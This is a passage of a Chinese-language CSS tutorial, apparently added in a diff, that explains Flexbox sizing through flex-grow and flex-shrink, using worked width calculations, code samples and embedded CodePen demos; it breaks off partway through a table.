+<p>在上面示例的基础上，我们可以给每个Flex项目的<code>flex</code>设置三个值：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex" src="./Flexbox布局：图解CSS(Part2)_files/vYLeezE.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/vYLeezE'>Flexbox Layout Model: flex</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>事实上，<code>flex</code>在Flexbox布局模块中是一个复杂的属性，为了更好的向大家阐述清楚该属性，接下来主要分三个部分来阐述。即<code>flex</code>的三个子属性：<code>flex-grow</code>（扩展比率）、<code>flex-shrink</code>（收缩比率）和 <code>flex-basis</code>（伸缩基准）。这三个属性可以控制Flex项目，具体的表现如下：</p>
+
+<ul>
+<li><code>flex-grow</code>：设置Flex项目的扩展比率，让Flex项目得到（扩展）多少Flex容器剩余空间（Positive Free Space），即Flex项目可能会变大</li>
+<li><code>flex-shrink</code>：设置Flex项目收缩比率，让Flex项目减去Flex容器不足的空间（Negative Free Space），即Flex项目可能会变小</li>
+<li><code>flex-basis</code>：Flex项目未扩展或收缩之前，它的大小，即指定了Flex项目在主轴方向的初始大小</li>
+</ul>
+
+<p>也就是说，<strong><code>flex-grow</code>、<code>flex-shrink</code>和<code>flex-basis</code>可以用来指定或改变Flex项目的大小</strong>。在具体介绍这几个属性之前，先给大家介绍几个概念。</p>
+
+<h4 class="content-title" data-index="4">剩余空间和不足空间</h4>
+
+<p>在Flexbox布局模块中，Flex容器中可能会包含一个或多个Flex项目。而Flex容器和Flex项目都有其自身的尺寸大小，那么就会有<strong>Flex项目尺寸大小之和大于或小于Flex容器</strong>的情景：</p>
+
+<ul>
+<li>当所有Flex项目尺寸大小之和小于Flex容器时，Flex容器就会有多余的空间没有被填充，那么这个空间就被称为 <strong>Flex容器的剩余空间（Positive Free Space）</strong></li>
+<li>当所有Flex项目尺寸大小之和大于Flex容器时，Flex容器就没有足够的空间容纳所有Flex项目（Flex项目会溢出Flex容器），那么多出来的这个空间就被称为<strong>不足空间（Negative Free Space）</strong>，也被称为负空间</li>
+</ul>
+
+<p>举个例子向大家阐述这两种情形：“假设我们有一个Flex容器，显式给其设置了<code>width</code>为<code>80vw</code>，并且该Flex容器中包含了四个Flex项目，每个Flex项目的<code>width</code>为<code>10vw</code>”。这个时候所有Flex项目的宽度总和则是<code>10vw x 4 = 40vw</code>，那么Flex容器将会有剩余空间，即<code>80vw - 40vw = 40vw</code>。这个 <strong><code>40vw</code></strong> 就是Flex容器的剩余空间：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-56.png" alt=""></p>
+
+<p>再来看第二种情形：“假设Flex容器<code>width</code>为<code>40vw</code>，并且每个Flex项目的<code>width</code>为<code>20vw</code>”。这个时候所有Flex项目的宽度总和则是<code>20vw x 4 = 80vw</code>，那么Flex容器则没有足够的空间容纳Flex项目（Flex项目会溢出Flex容器），即<code>40vw - 80vw = -40vw</code>。这个 <strong><code>40vw</code></strong>就是我们所说的Flex容器的不足空间：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-57.png" alt=""></p>
+
+<p>上面演示的是主轴在<code>x</code>轴方向，如果主轴变成<code>y</code>轴的方向，同样存在上述两种情形，只不过<code>width</code>变成了<code>height</code>。</p>
+
+<h4 class="content-title" data-index="4">CSS尺寸属性和值</h4>
+
+<p>如果你有阅读过《<a href="https://www.w3cplus.com/css/css-intrinsic-and-extrinsic-sizing.html" target="_blank">图解CSS: 元素尺寸的设置</a>》、《<a href="https://www.w3cplus.com/css/css-logical-properties.html" target="_blank">图解CSS：CSS逻辑属性</a>》以及《<a href="https://www.w3cplus.com/css/web-layout-box-module.html" target="_blank">CSS 盒模型</a>》的话，你会发现在CSS中可以通过不同的属性以及不同的值来设置元素大小。比如，在CSS中我们可以通过下面这些属性给Flex项目显式指定尺寸：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-58.png" alt=""></p>
+
+<p>能用于上图中属性的值，可以是下面这些：</p>
+
+<ul>
+<li><strong><code>auto</code></strong>：设置值为<code>auto</code>时，容器的大小将会以容器的内容来计算，它将是一个自动大小；不过给<code>min-width</code>、<code>min-height</code>、<code>min-inline-size</code>或<code>min-block-size</code>设置值为<code>auto</code>时，将会指定一个自动计算好的最小值</li>
+<li><strong><code>none</code></strong>：如果取值为<code>none</code>时，元素盒子的大小是没有任何限制</li>
+<li><strong><code>&lt;length-percentage&gt;</code></strong>：使用<code>&lt;length&gt;</code>或<code>&lt;percent&gt;</code>指定元素的大小，在适当情况下，根据其父元素的宽度来解析百分比</li>
+<li><strong><code>min-content</code></strong>：如果指定了内联轴，那么<code>min-content</code>对应的大小则是内联大小，否则将表现为属性的初始值，即固有的最小宽度</li>
+<li><strong><code>max-content</code></strong>：如果指定了内联轴，那么<code>max-content</code>对应的大小则是内联大小，否则将表现为属性的初始值，即固有的首选宽度</li>
+<li><strong><code>fit-content()</code></strong>：如果显式指定了内联轴，使用<code>fit-content()</code>函数，可以用指定的参数替换可用空间，即<code>min(max-content, max(min-content, &lt;length-percentage&gt;))</code>；否则将表现为属性的初始值。对于内在尺寸，<code>fit-content(&lt;length&gt;)</code>表现长度值（<code>&lt;length&gt;</code>）。如果<code>fit-content()</code>使用了百分比值，将会作为<code>min-content</code>当作最小内容，<code>max-content</code>作为最大内容</li>
+</ul>
+
+<p>而其中<code>auto</code>、<code>min-content</code>、<code>max-content</code>和<code>fit-content()</code>又被称为<strong>自动计算尺寸大小方式</strong>。</p>
+
+<p>在CSS中除了<code>width</code>、<code>height</code>、<code>inline-size</code>和<code>block-size</code>会影响元素尺寸大小之外，还有运用于元素盒子的属性，比如内距，边框等都会影响元素尺寸大小。有关于这方面更详细的介绍可以阅读《<a href="https://www.w3cplus.com/css/web-layout-box-module.html" target="_blank">CSS 盒模型</a>》一文。</p>
+
+<h4 class="content-title" data-index="4">内部尺寸和外部尺寸</h4>
+
+<p>熟悉CSS盒模型的同学都知道，根据盒子不同的边缘可以将盒子划分成不同类型的盒子，比如<code>content-box</code>、<code>padding-box</code>、<code>border-box</code>和<code>margin-box</code>：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-sizing-2.png" alt=""></p>
+
+<p>其中<code>content-box</code>对应的尺寸被称为<strong>内部尺寸</strong>，而<code>margin-box</code>对应的尺寸被称为<strong>外部尺寸</strong>。</p>
+
+<h4 class="content-title" data-index="4">明确的尺寸和不确定的尺寸</h4>
+
+<p><strong>明确的尺寸</strong>指的是不需要执行布局就可以确定盒子的大小。也就是说，显式给容器设置一个固定值、或内容所占区域的大小、或一个容器块的初始大小，或通过其他计算方式得到的尺寸（比如Flexbox布局中的“拉伸和压缩（Strretch-fit）”）。</p>
+
+<p><strong>不确定的尺寸</strong>指的是一个未知的尺寸。换句话容器的大小具备无限空间（即有可能很大，也有可能很小）。</p>
+
+<p>通俗一点来理解的话，明确的尺寸是知道容器的<code>width</code>（或<code>inline-size</code>）和<code>height</code>（或<code>block-size</code>）；不确定的尺寸是需要根据内容来计算的，所以要知道不确定的尺寸需要先检查内容。</p>
+
+<p>有了上述概念之后，我们就可以开始进入<code>flex-grow</code>、<code>flex-shrink</code>和<code>flex-basis</code>三个属性的世界。</p>
+
+<h4 class="content-title" data-index="4"><code>flex-grow</code></h4>
+
+<p><code>flex-grow</code>的语法规则很简单：</p>
+
+<pre class="javascript"><code class="javascript">flex-grow: <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">number</span></span>&gt;</span></span></span><span class="xml">
+</span></span></code></pre>
+
+<p>其中<code>&lt;number&gt;</code>是一个正数的数值，并且其默认值是<code>0</code>。</p>
+
+<p>在Flexbox布局模块中，<code>flex-grow</code>是一个<strong>扩展因子</strong>，也被称为<strong>扩展比例</strong>。其意思是，当Flex容器有一定的剩余空间时，<code>flex-grow</code>可以让Flex项目分配Flex容器剩余的空间，每个Flex项目将根据<code>flex-grow</code>因子扩展，从而让Flex项目占满整个Flex容器（有效的分配和利用Flex容器剩余空间）。</p>
+
+<p>当<code>flex-grow</code>的值是一个大于<code>0</code>的值时，Flex项目就会占用Flex容器剩余空间。在Flexbox布局模块中，在使用<code>flex-grow</code>时可以按下面的方式使用：</p>
+
+<ul>
+<li>所有Flex项目设置相同的<code>flex-grow</code>值</li>
+<li>每个Flex项目设置不同的<code>flex-grow</code>值</li>
+</ul>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-grow" src="./Flexbox布局：图解CSS(Part2)_files/mdVqdRO.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/mdVqdRO'>Flexbox Layout Model: flex-grow</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>正如上例所示，在Flex项目中设置<code>flex-grow</code>之后，Flex项目会根据Flex容器宽度来动态调整自身的尺寸大小：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-59.png" alt=""></p>
+
+<p>当Flex容器没有任何剩余空间时，即使Flex项目显式设置了<code>flex-grow</code>的值，Flex项目也不会扩展（因为没有空间可扩展）：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-60.gif" alt=""></p>
+
+<p>正如上图所示，<code>flex-grow</code>的不同设置得到的效果将会不一样，但<code>flex-grow</code>的值始终总量为<code>1</code>，也就是说，所有Flex项目的占有量总和（分子）和分母相同。</p>
+
+<p>如果你希望能更彻底的了解<code>flex-grow</code>，那就需要了解<code>flex-grow</code>的计算方法。<code>flex-grow</code>有相应的计算公式：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-61.png" alt=""></p>
+
+<p>下面用一个简单的示例来阐述<code>flex-grow</code>是如何分配Flex容器的剩余空间：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexGrow: 0"</span></span>&gt;</span></span>flex-grow:0<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexGrow: 1"</span></span>&gt;</span></span>flex-grow:1<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexGrow: 2"</span></span>&gt;</span></span>flex-grow:2<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexGrow: 3"</span></span>&gt;</span></span>flex-grow:3<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+
+/* CSS */
+
+:root {
+    --flexGrow: 0;
+}
+
+.flex__container {
+    inline-size: 80vw;
+}
+
+.flex__item {
+    flex-grow: var(--flexGrow);
+    inline-size: 10vw;
+}
+</code></pre>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-grow calculation" src="./Flexbox布局：图解CSS(Part2)_files/QWyObad.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/QWyObad'>Flexbox Layout Model: flex-grow calculation</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>从该示例的代码中我们可以获知：</p>
+
+<ul>
+<li>Flex容器的宽度是 <strong><code>80vw</code></strong> (CSS中设置了<code>inline-size: 80vw</code>)</li>
+<li>Flex容器中共有四个Flex项目，并且每个Flex项目的宽度是 <strong><code>10vw</code></strong>（CSS中设置了<code>inline-size: 10vw</code>）</li>
+<li>Flex项目宽度总和为<code>10vw x 4 = 40vw</code></li>
+<li>Flex容器的剩余空间为<code>80vw - 40vw = 40vw</code></li>
+<li>Flex项目的<code>flex-grow</code>的值分别是<code>0</code>、<code>1</code>、<code>2</code>和<code>3</code>，所有Flex项目的<code>flex-grow</code>总和为<code>0 + 1 + 2 + 3 = 6</code></li>
+</ul>
+
+<p>即：</p>
+
+<table>
+<thead>
+<tr>
+  <th><code>flex-grow</code>公式中变量名称</th>
+  <th>Flex项目1</th>
+  <th>Flex项目2</th>
+  <th>Flex项目3</th>
+  <th>Flex项目4</th>
+  <th>总数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Flex项目的<code>flex-grow</code>值</td>
+  <td><code>0</code></td>
+  <td><code>1</code></td>
+  <td><code>2</code></td>
+  <td><code>3</code></td>
+  <td><code>0 + 1 + 2 + 3 = 6</code></td>
+</tr>
+<tr>
+  <td>Flex项目的宽度(<code>width</code>)</td>
+  <td><code>10vw</code></td>
+  <td><code>10vw</code></td>
+  <td><code>10vw</code></td>
+  <td><code>10vw</code></td>
+  <td><code>10vw x 4 = 40vw</code></td>
+</tr>
+<tr>
+  <td>Flex容器的宽度(<code>width</code>)</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td><code>80vw</code></td>
+</tr>
+<tr>
+  <td>Flex容器的剩余空间</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td>&nbsp;</td>
+  <td><code>80vw - 40vw = 40vw</code></td>
+</tr>
+<tr>
+  <td><strong>Flex项目新宽度(<code>width</code>)</strong></td>
+  <td><code>?</code></td>
+  <td><code>?</code></td>
+  <td><code>?</code></td>
+  <td><code>?</code></td>
+  <td>&nbsp;</td>
+</tr>
+</tbody>
+</table>
+
+<p>有了这些参数值之后，根据上面提供的<code>flex-grow</code>计算公式就可以计算出每个Flex项目的宽度：</p>
+
+<pre class="undefined"><code class="undefined">» 计算之后的Flex项目宽度 = (Flex项目的flex-grow值 ÷ 所有Flex项目的flex-grow总值 × Flex容器剩余空间 ) + Flex项目初始宽度
+
+» 计算之后的Flex1项目宽度 = (0 ÷ 6 × 40 ) + 10 = 10vw
+» 计算之后的Flex2项目宽度 = (1 ÷ 6 × 40 ) + 10 = 16.667vw
+» 计算之后的Flex3项目宽度 = (2 ÷ 6 × 40 ) + 10 = 23.333vw
+» 计算之后的Flex4项目宽度 = (3 ÷ 6 × 40 ) + 10 = 30vw
+</code></pre>
+
+<p>具体如下图所示：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-62.png" alt=""></p>
+
+<p>上面的示例中<code>flex-grow</code>的取值都是正整数值。事实上，<code>flex-grow</code>还可以设置为<strong>小数值</strong>。在上例的基础上，将Flex项目的<code>flex-grow</code>值分别设置为<code>0</code>、 <code>0.1</code>、<code>0.2</code>和<code>0.3</code>，此时所有Flex项目的<code>flex-grow</code>总和为<code>0.6</code>。虽然取值为小数，但其计算方式是一样的，只不过所有<code>flex-grow</code>值的总和小于<code>1</code>时，Flex容器的剩余空间不会完全分配完（<strong>最终还会有剩余的空间</strong>）。换句话说，就该例而言，Flex项目只分完了Flex容器剩余空间的<code>60%</code>。最终的效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-grow calculation" src="./Flexbox布局：图解CSS(Part2)_files/abdVvPO.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/abdVvPO'>Flexbox Layout Model: flex-grow calculation</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>虽然在Flex项目中显式设置了<code>flex-grow</code>的值（大于或等于<code>1</code>）时，Flex项目会根据相应的比率得到Flex容器剩余空间，Flex项目宽度会得到扩展（变宽），但这并不是绝对的，如果Flex项目上显式设置了<code>max-width</code>或<code>max-inline-size</code>时，Flex项目会受到它们的限制。比如下面这个示例，我们显式在Flex项目中设置<code>max-inline-size: 18vw</code>,得到的效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-grow calculation" src="./Flexbox布局：图解CSS(Part2)_files/WNrXQBa.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/WNrXQBa'>Flexbox Layout Model: flex-grow calculation</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>在上面的示例中，为了更好的向大家演示<code>flex-grow</code>的计算，在代码中给Flex项目显式的设置了<code>inline-size</code>的值为<code>10vw</code>（相当于设置了<code>flex-basis</code>值）。后面我们会详细的介绍<code>flex-basis</code>的使用。从示例的效果中不难发现，<code>flex-grow</code>和<code>inline-size</code>（或<code>flex-basis</code>）是会相互影响的。这也令Flex项目计算变得复杂化了，尤其是加入<code>min-width</code>、<code>min-inline-size</code>、<code>max-widt</code>和<code>max-inline-size</code>会更为复杂。</p>
+
+<p>为什么这么说呢？我们用一个示例来举例。比如说，不在Flex项目上显式的设置<code>inline-size</code>、<code>width</code>或<code>flex-basis</code>的值。根据我们所掌握的CSS知识可以得知，这个时候，Flex项目的大小会取决于其内容的大小（相当于<code>inline-size</code>或<code>width</code>设置了<code>max-content</code>）。</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-grow" src="./Flexbox布局：图解CSS(Part2)_files/GRoOojd.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/GRoOojd'>Flexbox Layout Model: flex-grow</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>示例中代码很简单：</p>
+
+<pre class="css"><code class="css"><span class="pseudo"><span class="pseudo">:root</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--flexGrow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.flex__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">inline-size</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">80</span></span>vw;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.flex__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-grow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--flexGrow)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>示例中的四个Flex项目的<code>flex-flow</code>的值都是相同的，即<code>1</code>。Flex容器的宽度设置的是<code>80vw</code>，具体渲染出来的容器宽度和浏览器视窗有关联，同时Flex项目并未显式指定具体宽度的属性，那么其宽度会根据自身内容来决定。为了更好的向大家演示，通过浏览器调试器，将对应元素的盒模型尺寸截图示意：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-63.png" alt=""></p>
+
+<p>从上图可以得到：</p>
+
+<ul>
+<li>Flex容器的宽度是<code>804px</code></li>
+<li>Flex项目的宽度分别是<code>43.36px</code>、<code>92.09px</code>、<code>140.83px</code>和<code>189.56px</code>，所有Flex项目宽度的总和为<code>465.84px</code></li>
+<li>Flex容器的剩余宽度为<code>804px - 465.84px = 338.16px</code></li>
+<li>所有Flex项目的<code>flex-grow</code>值为<code>1</code></li>
+</ul>
+
+<p>将相应的值套用到<code>flex-grow</code>的公式中，可以得到：</p>
+
+<pre class="undefined"><code class="undefined">» 计算之后的Flex项目宽度 = (Flex项目的flex-grow值 ÷ 所有Flex项目的flex-grow总值 × Flex容器剩余空间 ) + Flex项目初始宽度
+
+» 计算之后的Flex1项目宽度 = (1 ÷ 4 × 338.16) + 43.36 = 127.9px
+» 计算之后的Flex2项目宽度 = (1 ÷ 4 × 338.16) + 92.09 = 176.63px
+» 计算之后的Flex3项目宽度 = (1 ÷ 4 × 338.16) + 140.83 = 225.37px
+» 计算之后的Flex4项目宽度 = (1 ÷ 4 × 338.16) + 189.56 = 274.1px
+</code></pre>
+
+<blockquote>
+  <p><strong>注意，不同的浏览器对小数处理有差异</strong>。</p>
+</blockquote>
+
+<h4 class="content-title" data-index="4"><code>flex-shrink</code></h4>
+
+<p><code>flex-shrink</code>和<code>flex-grow</code>有点类似，不同的是 <strong><code>flex-shrink</code>是用来控制Flex项目的收缩因子</strong>。通过前面的内容我们知道，在Flexbox布局中，有的时候Flex项目宽度总和会超过Flex容器宽度，造成Flex项目溢出Flex容器。对于开发者而言，总是希望Flex项目能根据容器的空间来自动调整自身的大小。针对这种场景，<code>flex-shrink</code>就能起作用了。</p>
+
+<p>简单地说，<code>flex-shrink</code>会将Flex容器不足的空间按收缩因子的比例分配到Flex项目上，这个时候Flex项目就会根据比例收缩宽度，以免Flex项目溢出Flex容器。</p>
+
+<p><code>flex-shrink</code>语法规则也很简单：</p>
+
+<pre class="javascript"><code class="javascript">flex-shrink: <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">number</span></span>&gt;</span></span></span><span class="xml">
+</span></span></code></pre>
+
+<p><code>flex-shrink</code>只接收正数值（可以是正整数，也可以是正小数），其默认值是<code>1</code>。即 <strong>Flex容器没有足够空间容纳所有Flex项目时，Flex项目默认都会收缩</strong>。如果你不想让Flex项目进行收缩，可以显式设置<code>flex-shrink</code>的值为 <strong><code>0</code></strong>，此时Flex项目始终会保持原始的<code>fit-content</code>宽度。</p>
+
+<p>在Flexbox布局模块中，在使用<code>flex-shrink</code>时也可以按下面的方式使用：</p>
+
+<ul>
+<li>所有Flex项目设置相同的<code>flex-shrink</code>值</li>
+<li>每个Flex项目设置不同的<code>flex-shrink</code>值</li>
+</ul>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-shrink" src="./Flexbox布局：图解CSS(Part2)_files/KKVyRGK.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/KKVyRGK'>Flexbox Layout Model: flex-shrink</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>正如上例所示，在Flex项目中不做任何设置，Flex项目会按相同的比例收缩（因为<code>flex-shrink</code>的默认值是<code>1</code>）；显式设置<code>flex-shrink</code>为<code>0</code>时，Flex项目不会收缩，将会溢出Flex容器；不同的Flex项目设置不同<code>flex-shrink</code>值时会按不同的比例收缩：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-64.png" alt=""></p>
+
+<p>同样的，<code>flex-shrink</code>也有一套相应的计算公式：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-65.png" alt=""></p>
+
+<p><code>flex-shrink</code>计算公式看上去要比<code>flex-grow</code>复杂一些，过程也多一点，但只要你真正理解了，就不会再有这样的感觉了。同样用实例来向大家阐述，这样更易于理解<code>flex-shrink</code>是如何计算，以达到Flex项目根据收缩因子自动收缩（或者说分配Flex容器不足空间）：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexShrink: 0"</span></span>&gt;</span></span>flex-shrink:0<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexShrink: 1"</span></span>&gt;</span></span>flex-shrink:1<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexShrink: 2"</span></span>&gt;</span></span>flex-shrink:2<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"flex__item"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"--flexShrink: 3"</span></span>&gt;</span></span>flex-shrink:3<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+
+/* CSS */
+
+:root {
+    --flexShrink: 0;
+}
+
+.flex__container {
+    inline-size: 40vw;
+}
+
+.flex__item {
+    flex-shrink: var(--flexShrink);
+    inline-size: 15vw;
+}
+</code></pre>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex-shrink" src="./Flexbox布局：图解CSS(Part2)_files/gOPXjGg.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/gOPXjGg'>Flexbox Layout Model: flex-shrink</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>从该示例的代码中我们可以获知：</p>
+
+<ul>
+<li>Flex容器的宽度是 <strong><code>40vw</code></strong> （CSS中设置了<code>inline-size: 40vw</code>）</li>
+<li>Flex容器中共有四个Flex项目，并且每个Flex项目的宽度都是 <strong><code>15vw</code></strong>（CSS中设置了<code>inline-size: 15vw</code>）</li>
+<li>Flex项目宽度总和为 <code>15vw x 4 = 60vw</code></li>
+<li>Flex容器的不足空间为 <code>40vw - 60vw = -20vw</code></li>
+<li>Flex项目的<code>flex-shrink</code>的值分别是<code>0</code>、<code>1</code>、<code>2</code>和<code>3</code>，所有Flex项目的<code>flex-shrink</code>总和为<code>0 + 1 + 2 + 3 = 6</code></li>
+</ul>
+
+<p>即：</p>
+
+<table>
+<thead>
+<tr>
+  <th><code>flex-shrink</code>公式中变量名称</th>
+  <th>Flex项目1</th>
+  <th>Flex项目2</th>
+  <th>Flex项目3</th>
+  <th>Flex项目4</th>
+  <th>总数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Flex项目的<code>flex-shrink</code>值</td>
+  <td><code>0</code></td>
+  <td><code>1</code></td>
+  <td><code>2</code></td>
+  <td><code>3</code></td>
+  <td><code>0 + 1 + 2 + 3 = 6</code></td>
+</tr>
+<tr>
+  <td>Flex项目的宽度(<code>width</code>)</td>
+  <td><code>15vw</code></td>
+  <td><code>15vw</code></td>
+  <td><code>15vw</code></td>
+  <td><code>15vw</code></td>
+  <td><code>15vw x 4 = 60vw</code></td>
+</tr>
+<tr>
+  <td>Flex容器的宽度(<code>width</code>)</td>
+  <td>&nbsp;</td>
